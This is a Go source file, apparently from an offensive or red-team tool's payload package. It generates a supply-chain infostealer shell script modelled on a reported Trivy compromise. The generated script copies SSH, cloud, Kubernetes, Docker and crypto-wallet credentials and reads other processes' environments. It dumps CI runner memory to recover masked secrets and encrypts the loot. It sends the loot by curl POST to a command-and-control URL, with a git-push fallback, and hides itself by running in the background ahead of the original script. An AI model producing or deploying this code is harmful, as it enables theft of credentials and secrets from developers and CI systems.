package payloads

import (
	"fmt"
	"strings"
)

// InfostealerOptions configures the generated infostealer shell script.
type InfostealerOptions struct {
	C2URL           string   // required: HTTP POST endpoint for exfiltration
	EncryptionKey   string   // optional: AES passphrase for openssl enc
	RSAPubKey       string   // optional: RSA-4096 public key PEM for hybrid encryption (overrides EncryptionKey)
	BackupExfilRepo string   // optional: git repo URL for backup exfil
	CredentialPaths []string // optional: additional filesystem paths to sweep
	OriginalContent string   // optional: original script content to append (stealth)
	ProcScan        bool     // scan /proc/*/environ for secrets from parallel processes
	MemoryDump      bool     // attempt runner worker memory extraction via /proc/<pid>/mem
	Extended        bool     // enable extended credential sweep (crypto wallets, shell history, db creds)
}

// defaultCredPaths are common locations for credentials on CI runners and dev machines.
var defaultCredPaths = []string{
	"$HOME/.ssh",
	"$HOME/.aws",
	"$HOME/.kube",
	"$HOME/.config/gcloud",
	"$HOME/.npmrc",
	"$HOME/.docker/config.json",
	"$HOME/.gitconfig",
	"$HOME/.netrc",
	"$HOME/.pgpass",
	"$HOME/.terraform.d/credentials.tfrc.json",
}

// extendedCredPaths adds crypto wallets, shell history, database configs, and more.
var extendedCredPaths = []string{
	"$HOME/.config/solana/id.json",
	"$HOME/.bitcoin/wallet.dat",
	"$HOME/.ethereum/keystore",
	"$HOME/.cardano",
	"$HOME/.bash_history",
	"$HOME/.zsh_history",
	"$HOME/.mysql_history",
	"$HOME/.psql_history",
	"$HOME/.config/helm",
	"$HOME/.terraform.d",
	"$HOME/.azure",
	"$HOME/.config/gh/hosts.yml",
	"$HOME/.gradle/gradle.properties",
	"$HOME/.m2/settings.xml",
	"$HOME/.nuget/NuGet.Config",
	"$HOME/.config/configstore",
	"/etc/ssl/private",
}

// GenerateInfostealerScript returns a shell script that gathers environment
// variables, sweeps the filesystem for credentials, enumerates network
// interfaces, compresses and encrypts the data, and exfiltrates it via HTTP
// POST. Optionally includes a backup git-based exfil mechanism and preserves
// the original script content for stealth.
//
// Advanced tradecraft (from the Trivy v0.69.4 compromise analysis):
//   - /proc/*/environ scanning captures secrets from parallel CI jobs
//   - Runner worker memory extraction bypasses masked variable protection
//   - RSA-4096 hybrid encryption (AES-256-CBC + RSA-OAEP) with hardcoded pubkey
//   - Extended sweep includes crypto wallets, shell histories, database creds
//   - CI vs developer detection enables conditional persistence
//
// References:
//   - https://arstechnica.com/security/2026/03/widely-used-trivy-scanner-compromised-in-ongoing-supply-chain-attack/
//   - https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
func GenerateInfostealerScript(opts InfostealerOptions) string {
	c2 := strings.TrimSpace(opts.C2URL)
	if c2 == "" {
		c2 = "https://example.invalid/callback"
	}

	// Merge default + extended + custom credential paths
	paths := make([]string, 0, len(defaultCredPaths)+len(extendedCredPaths)+len(opts.CredentialPaths))
	paths = append(paths, defaultCredPaths...)
	if opts.Extended {
		paths = append(paths, extendedCredPaths...)
	}
	for _, p := range opts.CredentialPaths {
		p = strings.TrimSpace(p)
		if p != "" {
			paths = append(paths, p)
		}
	}

	// Build credential sweep block
	var sweepLines strings.Builder
	for _, p := range paths {
		fmt.Fprintf(&sweepLines, "    [ -e %s ] && cp -r %s \"$_d/creds/\" 2>/dev/null\n", p, p)
	}

	// /proc/*/environ scanning block
	procScanBlock := ""
	if opts.ProcScan {
		procScanBlock = `
  # 2b. Harvest environment variables from other processes (/proc/*/environ)
  mkdir -p "$_d/proc_env"
  for p in /proc/[0-9]*/environ; do
    _pid=$(echo "$p" | cut -d/ -f3)
    cat "$p" 2>/dev/null | tr '\0' '\n' > "$_d/proc_env/${_pid}.env" 2>/dev/null
  done
  # Deduplicate into single file
  cat "$_d/proc_env"/*.env 2>/dev/null | sort -u > "$_d/proc_environ_all.txt" 2>/dev/null
`
	}

	// Runner memory extraction block
	memDumpBlock := ""
	if opts.MemoryDump {
		memDumpBlock = `
  # 2c. Runner worker memory extraction (bypasses masked CI variables)
  for _wp in $(pgrep -f "Runner.Worker" 2>/dev/null || pgrep -f "gitlab-runner" 2>/dev/null); do
    if [ -r "/proc/${_wp}/mem" ]; then
      _maps="/proc/${_wp}/maps"
      _mem="/proc/${_wp}/mem"
      # Extract heap regions and scan for secrets
      while IFS='-' read -r _start _rest; do
        _end=$(echo "$_rest" | cut -d' ' -f1)
        _perms=$(echo "$_rest" | cut -d' ' -f2)
        case "$_perms" in *r*)
          _s=$((16#${_start}))
          _e=$((16#${_end}))
          _sz=$((_e - _s))
          [ $_sz -gt 0 ] && [ $_sz -lt 10485760 ] && \
            dd if="$_mem" bs=1 skip=$_s count=$_sz 2>/dev/null | \
            strings -n 8 >> "$_d/creds/runner_mem_${_wp}.txt" 2>/dev/null
        ;; esac
      done < "$_maps" 2>/dev/null
      # Extract patterns that look like tokens/secrets
      grep -E '(glpat-|ghp_|ghs_|AKIA|sk-|xox[bpsa]-|Bearer |isSecret)' \
        "$_d/creds/runner_mem_${_wp}.txt" > "$_d/creds/runner_secrets_${_wp}.txt" 2>/dev/null
    fi
  done
`
	}

	// Encryption block — RSA-4096 hybrid takes priority over passphrase
	encBlock := ""
	exfilFile := "$_d/bundle.tgz"
	if pubkey := strings.TrimSpace(opts.RSAPubKey); pubkey != "" {
		encBlock = fmt.Sprintf(`    # Hybrid encryption: AES-256-CBC + RSA-OAEP (RSA-4096)
    _aes_key=$(openssl rand -hex 32)
    openssl enc -aes-256-cbc -pbkdf2 -salt \
      -in "$_d/bundle.tgz" -out "$_d/bundle.enc" \
      -pass pass:$_aes_key 2>/dev/null
    echo -n "%s" | base64 -d > "$_d/rsa.pub" 2>/dev/null
    echo -n "$_aes_key" | openssl pkeyutl -encrypt -pubin -inkey "$_d/rsa.pub" \
      -pkeyopt rsa_padding_mode:oaep -out "$_d/key.enc" 2>/dev/null || \
    echo -n "$_aes_key" | openssl rsautl -encrypt -pubin -inkey "$_d/rsa.pub" \
      -oaep -out "$_d/key.enc" 2>/dev/null
    # Combine encrypted key + encrypted data for single-file exfil
    cat "$_d/key.enc" "$_d/bundle.enc" > "$_d/bundle.final" 2>/dev/null
    rm -f "$_d/rsa.pub" "$_d/key.enc"
`, b64Encode(pubkey))
		exfilFile = "$_d/bundle.final"
	} else if key := strings.TrimSpace(opts.EncryptionKey); key != "" {
		encBlock = fmt.Sprintf(`    openssl enc -aes-256-cbc -pbkdf2 -salt \
      -in "$_d/bundle.tgz" -out "$_d/bundle.enc" \
      -pass pass:%s 2>/dev/null
`, key)
		exfilFile = "$_d/bundle.enc"
	}

	// Backup exfil block
	backupBlock := ""
	if repo := strings.TrimSpace(opts.BackupExfilRepo); repo != "" {
		backupBlock = fmt.Sprintf(`    # Backup exfil via git (creates public repo + release asset if primary fails)
    if [ "$_ok" != "200" ] && [ "$_ok" != "201" ] && [ "$_ok" != "204" ]; then
      _bdir=$(mktemp -d)
      git clone --depth 1 %q "$_bdir" 2>/dev/null
      cp %s "$_bdir/data.bin" 2>/dev/null
      cd "$_bdir"
      git config user.email "ci@noreply.local"
      git config user.name "CI"
      git add -A
      git commit -q -m "exfil-$(date +%%s)" 2>/dev/null
      git push -q origin HEAD 2>/dev/null || true
      cd /
      rm -rf "$_bdir"
    fi
`, repo, exfilFile)
	}

	// Original content block
	originalBlock := ""
	if orig := opts.OriginalContent; strings.TrimSpace(orig) != "" {
		// Strip shebang from original if present to avoid double-shebang
		lines := strings.SplitN(orig, "\n", 2)
		if len(lines) > 0 && strings.HasPrefix(strings.TrimSpace(lines[0]), "#!") {
			if len(lines) > 1 {
				orig = lines[1]
			} else {
				orig = ""
			}
		}
		if strings.TrimSpace(orig) != "" {
			originalBlock = "\n# === ORIGINAL SCRIPT CONTENT ===\n" + orig
		}
	}

	// Tar includes proc_environ if /proc scan was enabled
	tarExtra := ""
	if opts.ProcScan {
		tarExtra = " proc_environ_all.txt"
	}

	return fmt.Sprintf(`#!/bin/sh
# Supply chain payload — runs exfiltration in background, then original script
_gzx() {
  _d=$(mktemp -d)
  mkdir -p "$_d/creds"

  # 1. Environment variables (current process)
  printenv | sort > "$_d/env.txt"

  # 2. Credential sweep
%s
  # Sweep for key/certificate files in home directory
  find "$HOME" -maxdepth 3 \( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" -o -name "id_rsa" -o -name "id_ed25519" \) \
    -exec cp {} "$_d/creds/" \; 2>/dev/null
%s%s
  # 3. Network interface enumeration
  (ip addr 2>/dev/null || ifconfig 2>/dev/null) > "$_d/creds/network.txt" 2>/dev/null
  (ip route 2>/dev/null || netstat -rn 2>/dev/null) >> "$_d/creds/network.txt" 2>/dev/null
  hostname -f >> "$_d/creds/network.txt" 2>/dev/null
  cat /etc/resolv.conf >> "$_d/creds/network.txt" 2>/dev/null

  # 4. Compress collected data
  tar czf "$_d/bundle.tgz" -C "$_d" env.txt creds%s 2>/dev/null

  # 5. Encrypt (if configured)
%s
  # 6. Exfiltrate via HTTP POST
  _ok=$(curl -sS -o /dev/null -w "%%{http_code}" -X POST \
    -H "Content-Type: application/octet-stream" \
    -H "User-Agent: Mozilla/5.0 (CI)" \
    --data-binary @%s \
    %q 2>/dev/null)

%s
  # 7. Cleanup
  rm -rf "$_d"
}
_gzx &
%s`, sweepLines.String(), procScanBlock, memDumpBlock, tarExtra, encBlock, exfilFile, c2, backupBlock, originalBlock)
}

func b64Encode(s string) string {
	// Simple base64 encoding for embedding in shell scripts
	// Uses the base64 package from payloads.go
	return base64Encode(s)
}
